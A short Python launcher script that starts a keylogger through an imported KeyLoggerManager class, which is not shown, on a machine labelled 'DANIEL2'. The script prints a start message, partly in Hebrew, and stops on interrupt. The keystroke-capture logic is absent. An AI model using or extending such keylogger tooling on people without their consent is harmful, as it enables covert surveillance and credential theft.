import time
from KeyLoggerManager import KeyLoggerManager

if __name__ == "__main__":
    manager = KeyLoggerManager(interval_seconds=10, machine_name="DANIEL2")
    manager.start()
    print("Keylogger started, לחץ ESC לעצירה...")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        manager.stop()